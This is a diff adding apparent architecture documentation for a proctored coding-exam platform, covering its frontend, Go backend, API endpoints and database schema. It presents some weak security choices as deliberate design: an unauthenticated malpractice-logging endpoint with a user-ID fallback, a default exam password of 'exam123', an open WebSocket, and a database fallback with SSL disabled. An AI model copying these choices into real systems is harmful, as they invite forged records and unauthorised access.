+REACT &lt;--&gt;|&quot;WebSocket&quot;| YOLO
+GOAUTH --&gt;|&quot;GORM ORM&quot;| SUPABASE
+GOAUTH --&gt;|&quot;Fallback&quot;| SQLITE
+GOAUTH --&gt;|&quot;HTTP POST&quot;| RESEND
+COCO --&gt;|&quot;Video frames&quot;| WEBCAM
+MEDIAPIPE --&gt;|&quot;Video frames&quot;| WEBCAM&lt;/div&gt;
+</code></pre>
+<h3>Communication Boundaries</h3>
+<table>
+<thead>
+<tr>
+<th>Connection</th>
+<th>Protocol</th>
+<th>Auth</th>
+<th>Data Format</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Frontend → backend-auth</td>
+<td>HTTP/HTTPS REST</td>
+<td>Bearer JWT in <code>Authorization</code> header</td>
+<td>JSON request/response</td>
+</tr>
+<tr>
+<td>Frontend → Anticheating</td>
+<td>HTTP/HTTPS REST</td>
+<td>Bearer JWT</td>
+<td>JSON</td>
+</tr>
+<tr>
+<td>Frontend ↔ yolo-proctor</td>
+<td>WebSocket (ws:// or wss://)</td>
+<td>None (open)</td>
+<td>JSON with base64 image</td>
+</tr>
+<tr>
+<td>backend-auth → Supabase</td>
+<td>TCP/TLS PostgreSQL</td>
+<td>Connection string credentials</td>
+<td>SQL via GORM</td>
+</tr>
+<tr>
+<td>backend-auth → Resend</td>
+<td>HTTPS REST</td>
+<td>Bearer API key</td>
+<td>JSON email payload</td>
+</tr>
+<tr>
+<td>Frontend → COCO-SSD</td>
+<td>In-process (browser)</td>
+<td>N/A</td>
+<td>HTMLVideoElement frames</td>
+</tr>
+<tr>
+<td>Frontend → MediaPipe</td>
+<td>In-process (browser)</td>
+<td>N/A</td>
+<td>HTMLVideoElement frames</td>
+</tr>
+</tbody></table>
+<hr>
+<h1>3. FRONTEND — COMPLETE TECHNICAL BREAKDOWN</h1>
+<h2>3.1 Technology Stack</h2>
+<table>
+<thead>
+<tr>
+<th>Concern</th>
+<th>Technology</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Framework</td>
+<td>React</td>
+<td>19.2.7</td>
+</tr>
+<tr>
+<td>Language</td>
+<td>TypeScript</td>
+<td>5.7.2</td>
+</tr>
+<tr>
+<td>Build Tool</td>
+<td>Vite</td>
+<td>8.1.5</td>
+</tr>
+<tr>
+<td>Styling</td>
+<td>TailwindCSS</td>
+<td>4.3.3</td>
+</tr>
+<tr>
+<td>Routing</td>
+<td>react-router-dom</td>
+<td>7.18.1</td>
+</tr>
+<tr>
+<td>Code Editor</td>
+<td>@monaco-editor/react</td>
+<td>4.7.0</td>
+</tr>
+<tr>
+<td>AI (Browser)</td>
+<td>@tensorflow/tfjs + @tensorflow-models/coco-ssd</td>
+<td>4.22.0 / 2.2.3</td>
+</tr>
+<tr>
+<td>HTTP Client</td>
+<td>Native <code>fetch</code> (NOT Axios)</td>
+<td>Browser native</td>
+</tr>
+<tr>
+<td>Animations</td>
+<td>framer-motion</td>
+<td>12.42.2</td>
+</tr>
+<tr>
+<td>Charts</td>
+<td>recharts</td>
+<td>3.10.0</td>
+</tr>
+<tr>
+<td>Icons</td>
+<td>lucide-react</td>
+<td>1.25.0</td>
+</tr>
+<tr>
+<td>Analytics</td>
+<td>@vercel/analytics</td>
+<td>2.0.1</td>
+</tr>
+<tr>
+<td>Utilities</td>
+<td>clsx, tailwind-merge</td>
+<td>2.1.1 / 3.6.0</td>
+</tr>
+</tbody></table>
+<h2>3.2 Component Architecture</h2>
+<pre><code>&lt;App&gt;
+  └── &lt;BrowserRouter&gt;
+       └── &lt;AuthProvider&gt;           ← Auth state (user, token, login/register/logout)
+            └── &lt;MonitoringProvider&gt; ← Security state (confidence, violations, fullscreen, camera)
+                 └── &lt;ExamProvider&gt;  ← Exam state (problems, code, timer, run/submit)
+                      └── &lt;ApplicationTheme&gt;
+                           ├── &lt;PremiumWorkspaceBackground&gt;  ← Animated background (non-landing pages)
+                           └── &lt;AppRoutes&gt;
+                                ├── / → &lt;LandingPage&gt;
+                                ├── /login → &lt;CandidateLogin&gt;
+                                ├── /register → &lt;CandidateRegister&gt;
+                                ├── /dashboard → &lt;CandidateDashboard&gt;
+                                ├── /exam → &lt;ExamPage&gt;
+                                │    ├── &lt;ProblemDescription&gt;
+                                │    ├── &lt;MonacoWrapper&gt;
+                                │    ├── &lt;ConsoleOutput&gt;
+                                │    └── &lt;AICameraWidget&gt;  ← THE AI ENGINE
+                                │         ├── COCO-SSD (in-browser)
+                                │         ├── MediaPipe FaceMesh (CDN loaded)
+                                │         └── YOLOv8 WebSocket client
+                                ├── /admin/dashboard → &lt;AdminDashboard&gt;
+                                │    ├── &lt;AdminTimerControl&gt;
+                                │    ├── &lt;LiveCandidateCard&gt;
+                                │    ├── &lt;CandidateDetailModal&gt;
+                                │    ├── &lt;CreateProblemModal&gt;
+                                │    └── &lt;StatCard&gt;
+                                └── ... (leaderboard, profile, about, etc.)
+</code></pre>
+<h2>3.3 State Management — Three React Contexts</h2>
+<h3>AuthContext (<a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/contexts/AuthContext.tsx">AuthContext.tsx</a>)</h3>
+<p><strong>State</strong>: <code>user: UserProfile | null</code><br><strong>Derived</strong>: <code>role</code>, <code>isAuthenticated</code><br><strong>Persistence</strong>: <code>localStorage</code> keys <code>codeshield_auth_user</code> and <code>codeshield_token</code><br><strong>On Mount</strong>: If <code>codeshield_token</code> exists in localStorage, calls <code>api.user.getProfile()</code> to rehydrate the user profile from the backend. If the token is expired, the backend returns 401 and localStorage is cleared.</p>
+<h3>MonitoringContext (<a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/contexts/MonitoringContext.tsx">MonitoringContext.tsx</a>)</h3>
+<p><strong>State</strong>: <code>confidenceScore</code> (starts at 94), <code>riskScore</code> (starts at 12), <code>warningsCount</code> (starts at 1), <code>isLocked</code>, <code>lockReason</code>, <code>cameraActive</code>, <code>micActive</code>, <code>isFullscreen</code>, <code>tabFocused</code>, <code>events[]</code></p>
+<p><strong>Key mechanism — <code>reportViolation()</code></strong>:</p>
+<ol>
+<li>Creates a <code>MonitoringEvent</code> via <code>api.monitor.reportEvent()</code></li>
+<li>Adds it to the local <code>events</code> array</li>
+<li>Adjusts <code>confidenceScore</code> by adding the negative <code>impact</code> value</li>
+<li>Increases <code>riskScore</code> </li>
+<li>If severity is <code>High</code> or <code>Critical</code>, increments <code>warningsCount</code></li>
+<li>If <code>warningsCount &gt;= 3</code> OR severity is <code>Critical</code>, sets <code>isLocked = true</code> (exam lockout)</li>
+<li>Otherwise shows a warning modal with count (e.g., &quot;2/3&quot;)</li>
+</ol>
+<p><strong>Copy/Paste Protection Integration</strong>: Invokes <code>useCopyPasteProtection</code> hook when <code>isLocked || isFullscreen</code>. Violations are mapped from keyboard keys to event types (e.g., <code>&#39;c&#39;</code> → &quot;Copy Attempt (Ctrl+C)&quot;, severity Medium, impact -8).</p>
+<p><strong>Heartbeat</strong>: Every 5 seconds, sends <code>api.monitor.sendHeartbeat()</code> with candidateId, confidence, camera, and fullscreen status.</p>
+<h3>ExamContext (<a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/contexts/ExamContext.tsx">ExamContext.tsx</a>)</h3>
+<p><strong>State</strong>: <code>problems[]</code>, <code>currentProblem</code>, <code>selectedLanguage</code> (default <code>&#39;go&#39;</code>), <code>codeMap</code> (per-language code strings), <code>compilerResult</code>, <code>isRunning</code>, <code>isSubmitting</code>, <code>secondsRemaining</code>, <code>timerStatus</code>, <code>autoSaveStatus</code></p>
+<p><strong>Timer Synchronization</strong>:</p>
+<ul>
+<li><strong>Polling</strong>: Every 1,500ms, calls <code>api.timer.getStatus()</code> which hits <code>GET /api/timer/status</code> on the backend. Updates <code>timerStatus</code>, <code>durationMinutes</code>, <code>secondsRemaining</code>.</li>
+<li><strong>Local ticker</strong>: When <code>timerStatus === &#39;RUNNING&#39;</code>, a <code>setInterval</code> decrements <code>secondsRemaining</code> every 1 second. When it reaches 0, sets <code>timerStatus = &#39;ENDED&#39;</code>.</li>
+<li><strong>Auto-save simulation</strong>: After typing, a debounced 600ms timer sets <code>autoSaveStatus = &#39;Saving...&#39;</code> → then 400ms later sets <code>&#39;Saved&#39;</code>.</li>
+</ul>
+<p><strong>Code Execution</strong>:</p>
+<ul>
+<li><code>runCode()</code>: Calls <code>api.compiler.run(code, language, customInput, problemId)</code> → sets <code>compilerResult</code></li>
+<li><code>submitCode()</code>: Calls <code>api.compiler.submit(code, language, problemId)</code> → if all tests pass, sets <code>isSubmittedSuccessfully = true</code> and exits fullscreen</li>
+</ul>
+<h2>3.4 The Massive API Client — <code>api/client.ts</code></h2>
+<p>This 1,367-line file is the single most important frontend file. It implements a <strong>dual-mode architecture</strong>:</p>
+<ol>
+<li><strong>Online mode</strong>: Sends real HTTP requests to the Go backend using <code>fetch()</code> with Bearer JWT</li>
+<li><strong>Offline fallback</strong>: If the backend is unreachable (sleeping Render.com instance, network error), falls back to localStorage-based simulation</li>
+</ol>
+<p><strong><code>fetchWithTimeout()</code></strong>: All backend calls use a 3.5-second AbortController timeout to prevent the UI from hanging while Render.com cold-starts.</p>
+<p><strong>API Base URL Detection</strong>:</p>
+<pre><code class="language-typescript">const API_BASE = import.meta.env.VITE_API_BASE || (
+  window.location.hostname === &#39;localhost&#39;
+    ? &#39;http://localhost:8080/api&#39;
+    : &#39;https://system-monitoring-backend-new.onrender.com/api&#39;
+);
+</code></pre>
+<hr>
+<h1>4. BACKEND — COMPLETE INTERNAL ARCHITECTURE</h1>
+<h2>4.1 Startup Sequence (main.go)</h2>
+<pre><code>1. config.Load()           → Parse .env, build Config struct
+2. config.InitDB(cfg)      → Connect PostgreSQL (Supabase) → fallback to local PostgreSQL → fallback to SQLite
+3. GORM AutoMigrate        → Create/update 9 tables
+4. SeedInitialData          → Seed default admin, users, problems, timer
+5. Initialize Repositories → 8 repository instances
+6. Initialize Services     → 9 service instances (including email)
+7. Initialize Controllers  → 8 controller instances
+8. Initialize Middleware    → AuthMiddleware
+9. routes.Setup()          → Register all API routes on Gin engine
+10. router.Run(&quot;:8080&quot;)    → Start HTTP server
+</code></pre>
+<h2>4.2 Request Lifecycle</h2>
+<pre><code>HTTP Request
+  → gin.Recovery()         [panic recovery middleware]
+  → middleware.Logger()     [logs method, path, status, latency]
+  → middleware.CORS()       [sets Access-Control-Allow-* headers]
+  → Route matching          [Gin router tree]
+  → [Optional] AuthMiddleware.RequireAuth()/RequireAdmin()
+      → Extract &quot;Authorization: Bearer &lt;token&gt;&quot; header
+      → jwt.ParseWithClaims() with HMAC-SHA256
+      → Verify claims (role, expiration)
+      → Set user_id, email, role in gin.Context
+  → Controller handler
+      → c.ShouldBindJSON() for body validation
+      → Call service method
+  → Service layer
+      → Business logic
+      → Call repository method(s)
+  → Repository layer
+      → GORM query execution
+      → Return result or error
+  → Controller builds response
+      → utils.SuccessResponse() or utils.ErrorResponse()
+  → JSON serialization → HTTP Response
+</code></pre>
+<h2>4.3 Complete API Endpoint Catalog</h2>
+<h3>Public Endpoints (No Auth Required)</h3>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>URL</th>
+<th>Controller</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td><code>/health</code></td>
+<td>inline</td>
+<td>Health check → <code>{&quot;status&quot;:&quot;ok&quot;}</code></td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/auth/register</code></td>
+<td>AuthController.Register</td>
+<td>Candidate registration</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/auth/login</code></td>
+<td>AuthController.Login</td>
+<td>Candidate login</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/admin/register</code></td>
+<td>AuthController.AdminRegister</td>
+<td>Admin registration</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/admin/login</code></td>
+<td>AuthController.AdminLogin</td>
+<td>Admin login</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/api/timer/status</code></td>
+<td>TimerController.GetTimerStatus</td>
+<td>Current exam timer status</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/exam/verify-password</code></td>
+<td>TimerController.VerifyExamPassword</td>
+<td>Exam gate password check</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/api/problems</code></td>
+<td>ProblemController.GetAllProblems</td>
+<td>List all problems</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/api/problems/:problemId</code></td>
+<td>ProblemController.GetProblemByID</td>
+<td>Problem detail</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/monitoring/malpractice</code></td>
+<td>MalpracticeController.LogMalpractice</td>
+<td>Log a violation</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/api/monitoring/malpractice/user/:userId</code></td>
+<td>MalpracticeController.GetUserMalpractices</td>
+<td>User&#39;s violations</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/api/leaderboard</code></td>
+<td>LeaderboardController.GetLeaderboard</td>
+<td>Rankings</td>
+</tr>
+</tbody></table>
+<h3>User-Protected Endpoints (RequireAuth — user JWT)</h3>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>URL</th>
+<th>Controller</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td><code>/api/auth/logout</code></td>
+<td>AuthController.Logout</td>
+<td>Stateless logout</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/api/user/profile</code></td>
+<td>UserController.GetProfile</td>
+<td>Get user profile</td>
+</tr>
+<tr>
+<td>PUT</td>
+<td><code>/api/user/profile</code></td>
+<td>UserController.UpdateProfile</td>
+<td>Update profile fields</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/exam/start</code></td>
+<td>ExamController.StartExam</td>
+<td>Start exam session</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/api/exam/status</code></td>
+<td>ExamController.GetStatus</td>
+<td>Exam status + remaining time</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/exam/end</code></td>
+<td>ExamController.EndExam</td>
+<td>End exam</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/compiler/run</code></td>
+<td>CompilerController.RunCode</td>
+<td>Run against sample tests</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/compiler/submit</code></td>
+<td>CompilerController.SubmitCode</td>
+<td>Submit against all tests</td>
+</tr>
+</tbody></table>
+<h3>Admin-Protected Endpoints (RequireAdmin — admin JWT)</h3>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>URL</th>
+<th>Controller</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td><code>/api/admin/problems</code></td>
+<td>ProblemController.CreateProblem</td>
+<td>Create problem with test cases</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/api/admin/timer</code></td>
+<td>TimerController.GetTimerStatus</td>
+<td>Timer status</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/admin/timer/config</code></td>
+<td>TimerController.ConfigTimer</td>
+<td>Set duration + exam password</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/admin/timer/start</code></td>
+<td>TimerController.StartTimer</td>
+<td>Start for all candidates</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/admin/timer/pause</code></td>
+<td>TimerController.PauseTimer</td>
+<td>Pause assessment</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/admin/timer/resume</code></td>
+<td>TimerController.ResumeTimer</td>
+<td>Resume assessment</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/admin/timer/extend</code></td>
+<td>TimerController.ExtendTimer</td>
+<td>Add time</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/admin/timer/end</code></td>
+<td>TimerController.EndTimer</td>
+<td>End for all</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/api/admin/malpractice</code></td>
+<td>MalpracticeController.GetAllMalpractices</td>
+<td>All violation logs</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>[!IMPORTANT]
+The malpractice logging endpoint <code>POST /api/monitoring/malpractice</code> is <strong>NOT protected by authentication middleware</strong>. This is a deliberate design choice — the frontend may be in an offline/fallback state where no JWT token is available, and malpractice events must still be recorded. A <code>userID</code> fallback of <code>1</code> is used if no authenticated user is found.</p>
+</blockquote>
+<hr>
+<h1>5. DATABASE — COMPLETE DEEP DIVE</h1>
+<h2>5.1 Database Connection Strategy</h2>
+<p>The system implements a <strong>triple-fallback</strong> database strategy in <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/config/database.go">database.go</a>:</p>
+<ol>
+<li><strong>Primary</strong>: PostgreSQL via Supabase connection pooler (URI format for Supabase hosts)</li>
+<li><strong>Fallback</strong>: PostgreSQL via standard DSN format with <code>sslmode=disable</code></li>
+<li><strong>Last resort</strong>: Local SQLite file (<code>sqlite.db</code>) for development/demo</li>
+</ol>
+<h2>5.2 Complete Table Schema</h2>
+<h3><code>admins</code> Table</h3>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Type</th>
+<th>Constraints</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>uint (PK)</td>
+<td>auto-increment</td>
+<td>Primary key</td>
+</tr>
+<tr>
+<td>username</td>
+<td>varchar(50)</td>
+<td>uniqueIndex</td>
+<td>Admin username</td>
+</tr>
+<tr>
+<td>email</td>
+<td>varchar(255)</td>
+<td>uniqueIndex, NOT NULL</td>
+<td>Admin email</td>
+</tr>
+<tr>
+<td>password</td>
+<td>varchar</td>
+<td>NOT NULL</td>
+<td>bcrypt hash</td>
+</tr>
+<tr>
+<td>name</td>
+<td>varchar(255)</td>
+<td>NOT NULL</td>
+<td>Display name</td>
+</tr>
+<tr>
+<td>role</td>
+<td>varchar(20)</td>
+<td>NOT NULL, default <code>&#39;admin&#39;</code></td>
+<td>Always <code>&#39;admin&#39;</code></td>
+</tr>
+<tr>
+<td>created_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>Creation time</td>
+</tr>
+<tr>
+<td>updated_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>Last update</td>
+</tr>
+<tr>
+<td>deleted_at</td>
+<td>timestamp</td>
+<td>index, nullable</td>
+<td>Soft delete (GORM)</td>
+</tr>
+</tbody></table>
+<h3><code>users</code> Table</h3>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Type</th>
+<th>Constraints</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>uint (PK)</td>
+<td>auto-increment</td>
+<td>Primary key</td>
+</tr>
+<tr>
+<td>username</td>
+<td>varchar(50)</td>
+<td>uniqueIndex</td>
+<td>Username</td>
+</tr>
+<tr>
+<td>email</td>
+<td>varchar(255)</td>
+<td>uniqueIndex, NOT NULL</td>
+<td>Candidate email</td>
+</tr>
+<tr>
+<td>password</td>
+<td>varchar</td>
+<td>NOT NULL</td>
+<td>bcrypt hash</td>
+</tr>
+<tr>
+<td>name</td>
+<td>varchar(255)</td>
+<td>NOT NULL</td>
+<td>Full name</td>
+</tr>
+<tr>
+<td>role</td>
+<td>varchar(20)</td>
+<td>NOT NULL, default <code>&#39;user&#39;</code></td>
+<td>Always <code>&#39;user&#39;</code></td>
+</tr>
+<tr>
+<td>phone</td>
+<td>varchar(20)</td>
+<td>nullable</td>
+<td>Phone number</td>
+</tr>
+<tr>
+<td>college</td>
+<td>varchar(255)</td>
+<td>nullable</td>
+<td>Institution</td>
+</tr>
+<tr>
+<td>department</td>
+<td>varchar(255)</td>
+<td>nullable</td>
+<td>Department</td>
+</tr>
+<tr>
+<td>reg_no</td>
+<td>varchar(50)</td>
+<td>nullable</td>
+<td>Registration number</td>
+</tr>
+<tr>
+<td>created_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>—</td>
+</tr>
+<tr>
+<td>updated_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>—</td>
+</tr>
+<tr>
+<td>deleted_at</td>
+<td>timestamp</td>
+<td>index, nullable</td>
+<td>Soft delete</td>
+</tr>
+</tbody></table>
+<h3><code>exam_sessions</code> Table</h3>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Type</th>
+<th>Constraints</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>uint (PK)</td>
+<td>auto-increment</td>
+<td>—</td>
+</tr>
+<tr>
+<td>user_id</td>
+<td>uint</td>
+<td>index, NOT NULL, FK→users</td>
+<td>Which candidate</td>
+</tr>
+<tr>
+<td>status</td>
+<td>varchar(20)</td>
+<td>default <code>&#39;NOT_STARTED&#39;</code></td>
+<td>NOT_STARTED / ACTIVE / COMPLETED</td>
+</tr>
+<tr>
+<td>start_time</td>
+<td>timestamp</td>
+<td>nullable</td>
+<td>When exam started</td>
+</tr>
+<tr>
+<td>end_time</td>
+<td>timestamp</td>
+<td>nullable</td>
+<td>When exam ended</td>
+</tr>
+<tr>
+<td>duration</td>
+<td>int</td>
+<td>default <code>60</code></td>
+<td>Duration in minutes</td>
+</tr>
+<tr>
+<td>created_at, updated_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>—</td>
+</tr>
+</tbody></table>
+<h3><code>questions</code> Table (Problem model with <code>TableName() = &quot;questions&quot;</code>)</h3>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Type</th>
+<th>Constraints</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>uint (PK)</td>
+<td>—</td>
+<td>—</td>
+</tr>
+<tr>
+<td>title</td>
+<td>varchar(255)</td>
+<td>NOT NULL</td>
+<td>Problem title</td>
+</tr>
+<tr>
+<td>description</td>
+<td>text</td>
+<td>NOT NULL</td>
+<td>Full problem statement (Markdown)</td>
+</tr>
+<tr>
+<td>constraints</td>
+<td>text</td>
+<td>nullable</td>
+<td>Constraint text</td>
+</tr>
+<tr>
+<td>difficulty</td>
+<td>varchar(20)</td>
+<td>NOT NULL</td>
+<td>EASY / MEDIUM / HARD</td>
+</tr>
+<tr>
+<td>tags</td>
+<td>varchar(500)</td>
+<td>nullable</td>
+<td>Comma-separated tags</td>
+</tr>
+<tr>
+<td>sample_input</td>
+<td>text</td>
+<td>nullable</td>
+<td>Example input</td>
+</tr>
+<tr>
+<td>sample_output</td>
+<td>text</td>
+<td>nullable</td>
+<td>Example output</td>
+</tr>
+<tr>
+<td>time_limit</td>
+<td>int</td>
+<td>default <code>2</code></td>
+<td>Seconds</td>
+</tr>
+<tr>
+<td>memory_limit</td>
+<td>int</td>
+<td>default <code>256</code></td>
+<td>MB</td>
+</tr>
+<tr>
+<td>created_at, updated_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>—</td>
+</tr>
+</tbody></table>
+<h3><code>test_cases</code> Table</h3>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Type</th>
+<th>Constraints</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>uint (PK)</td>
+<td>—</td>
+<td>—</td>
+</tr>
+<tr>
+<td>problem_id</td>
+<td>uint</td>
+<td>index, NOT NULL, FK→questions</td>
+<td>Parent problem</td>
+</tr>
+<tr>
+<td>input</td>
+<td>text</td>
+<td>NOT NULL</td>
+<td>Test input</td>
+</tr>
+<tr>
+<td>expected</td>
+<td>text</td>
+<td>NOT NULL</td>
+<td>Expected output</td>
+</tr>
+<tr>
+<td>type</td>
+<td>varchar(10)</td>
+<td>default <code>&#39;SAMPLE&#39;</code></td>
+<td>SAMPLE (visible) or HIDDEN</td>
+</tr>
+<tr>
+<td>created_at, updated_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>—</td>
+</tr>
+</tbody></table>
+<h3><code>submissions</code> Table</h3>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Type</th>
+<th>Constraints</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>uint (PK)</td>
+<td>—</td>
+<td>—</td>
+</tr>
+<tr>
+<td>user_id</td>
+<td>uint</td>
+<td>index, NOT NULL</td>
+<td>Submitting candidate</td>
+</tr>
+<tr>
+<td>problem_id</td>
+<td>uint</td>
+<td>index, NOT NULL</td>
+<td>Which problem</td>
+</tr>
+<tr>
+<td>code</td>
+<td>text</td>
+<td>NOT NULL</td>
+<td>Full source code</td>
+</tr>
+<tr>
+<td>language</td>
+<td>varchar(20)</td>
+<td>default <code>&#39;go&#39;</code></td>
+<td>Programming language</td>
+</tr>
+<tr>
+<td>verdict</td>
+<td>varchar(30)</td>
+<td>default <code>&#39;Pending&#39;</code></td>
+<td>Accepted, Wrong Answer, etc.</td>
+</tr>
+<tr>
+<td>output</td>
+<td>text</td>
+<td>nullable</td>
+<td>Program stdout</td>
+</tr>
+<tr>
+<td>error_msg</td>
+<td>text</td>
+<td>nullable</td>
+<td>Compilation/runtime error</td>
+</tr>
+<tr>
+<td>exec_time</td>
+<td>float64</td>
+<td>—</td>
+<td>Execution time in seconds</td>
+</tr>
+<tr>
+<td>memory_used</td>
+<td>int</td>
+<td>—</td>
+<td>Memory in KB</td>
+</tr>
+<tr>
+<td>score</td>
+<td>int</td>
+<td>default <code>0</code></td>
+<td>Points earned</td>
+</tr>
+<tr>
+<td>created_at, updated_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>—</td>
+</tr>
+</tbody></table>
+<h3><code>leaderboards</code> Table</h3>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Type</th>
+<th>Constraints</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>uint (PK)</td>
+<td>—</td>
+<td>—</td>
+</tr>
+<tr>
+<td>user_id</td>
+<td>uint</td>
+<td>uniqueIndex, NOT NULL, FK→users</td>
+<td>One entry per user</td>
+</tr>
+<tr>
+<td>score</td>
+<td>int</td>
+<td>default <code>0</code></td>
+<td>Cumulative score</td>
+</tr>
+<tr>
+<td>problems_solved</td>
+<td>int</td>
+<td>default <code>0</code></td>
+<td>Distinct accepted problems</td>
+</tr>
+<tr>
+<td>total_submissions</td>
+<td>int</td>
+<td>default <code>0</code></td>
+<td>Total submission count</td>
+</tr>
+<tr>
+<td>total_time</td>
+<td>float64</td>
+<td>default <code>0</code></td>
+<td>Cumulative execution time</td>
+</tr>
+<tr>
+<td>last_submission_at</td>
+<td>timestamp</td>
+<td>—</td>
+<td>Latest submission timestamp</td>
+</tr>
+<tr>
+<td>created_at, updated_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>—</td>
+</tr>
+</tbody></table>
+<h3><code>exam_timers</code> Table (Singleton, ID=1)</h3>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Type</th>
+<th>Constraints</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>uint (PK)</td>
+<td>always <code>1</code></td>
+<td>Singleton timer</td>
+</tr>
+<tr>
+<td>duration_minutes</td>
+<td>int</td>
+<td>default <code>60</code></td>
+<td>Display minutes</td>
+</tr>
+<tr>
+<td>duration_seconds</td>
+<td>int</td>
+<td>default <code>0</code></td>
+<td>Display seconds</td>
+</tr>
+<tr>
+<td>exam_password</td>
+<td>varchar(255)</td>
+<td>default <code>&#39;exam123&#39;</code></td>
+<td>Gate password</td>
+</tr>
+<tr>
+<td>status</td>
+<td>varchar(20)</td>
+<td>default <code>&#39;NOT_STARTED&#39;</code></td>
+<td>NOT_STARTED / RUNNING / PAUSED / ENDED</td>
+</tr>
+<tr>
+<td>start_time</td>
+<td>timestamp</td>
+<td>nullable</td>
+<td>When timer started running</td>
+</tr>
+<tr>
+<td>accumulated_seconds</td>
+<td>int64</td>
+<td>default <code>0</code></td>
+<td>Time elapsed during paused segments</td>
+</tr>
+<tr>
+<td>total_duration_secs</td>
+<td>int64</td>
+<td>default <code>3600</code></td>
+<td>Total exam duration in seconds</td>
+</tr>
+<tr>
+<td>created_at, updated_at</td>
+<td>timestamp</td>
+<td>auto</td>
+<td>—</td>
+</tr>
+</tbody></table>
+<h3><code>malpractice_logs</code> Table</h3>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Type</th>
+<th>Constraints</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>uint (PK)</td>
+<td>auto-increment</td>
+<td>—</td>
+</tr>
+<tr>
+<td>user_id</td>
+<td>uint</td>
+<td>index, NOT NULL</td>
+<td>Offending candidate</td>
+</tr>
+<tr>
+<td>candidate_name</td>
+<td>varchar(255)</td>
+<td>NOT NULL, default <code>&#39;Candidate&#39;</code></td>
+<td>Name at time of event</td>
+</tr>
+<tr>
+<td>candidate_email</td>
+<td>varchar(255)</td>
+<td>nullable</td>
+<td>Email at time of event</td>
+</tr>
+<tr>
+<td>candidate_reg_no</td>
+<td>varchar(50)</td>
+<td>nullable</td>
+<td>Registration number</td>
+</tr>
+<tr>
+<td>event_type</td>
+<td>varchar(100)</td>
+<td>NOT NULL</td>
+<td>UNAUTHORIZED_OBJECT, TAB_SWITCH, EXIT_FULLSCREEN, DEVTOOLS_OPEN, MULTIPLE_FACES, COPY_PASTE, etc.</td>
+</tr>
+<tr>
+<td>details</td>
+<td>varchar(500)</td>
+<td>nullable</td>
+<td>Human-readable description</td>
+</tr>
+<tr>
+<td>severity</td>
+<td>varchar(20)</td>
+<td>default <code>&#39;WARNING&#39;</code></td>
